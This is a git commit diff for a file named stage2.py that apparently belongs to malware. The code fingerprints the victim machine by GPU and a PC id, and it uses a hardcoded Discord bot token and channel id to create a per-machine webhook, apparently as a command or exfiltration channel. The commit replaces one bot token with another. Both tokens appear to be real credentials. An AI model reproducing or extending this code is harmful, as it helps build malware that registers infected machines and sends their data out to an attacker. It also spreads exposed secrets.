1e4f636289b3c04f73a094687d23f5a1d2bff30a
mrhackerman2 <jimmflanmyifin@gmail.com>
2025-08-13 14:37:02 +0100

    Update stage2.py

--- stage2.py
+++ stage2.py
@@ -8,7 +8,7 @@ gpu = wmi.WMI().Win32_VideoController()[0].Name
 name = f"{gpu}(pc){pcid}"
 
 if not hook_file.exists() or requests.get(hook_file.read_text().strip()).status_code != 200:
-    TOKEN   = "MTI2NzU3NzAwMTA2NjEwMjg0Ng.G0uZwa.3a1GlafT1hXccMhDPblG32oGw3GBLZOev-6ZKA"
+    TOKEN   = "MTI2NzU3NzAwMTA2NjEwMjg0Ng.G93Cez.G1HWy0usx5TEnGJxlBOGFOEAFkLfShbInXxmAc"
     CHANNEL = "1404194403261878322"
     url = f"https://discord.com/api/v10/channels/{CHANNEL}/webhooks"
     body = {"name": name}
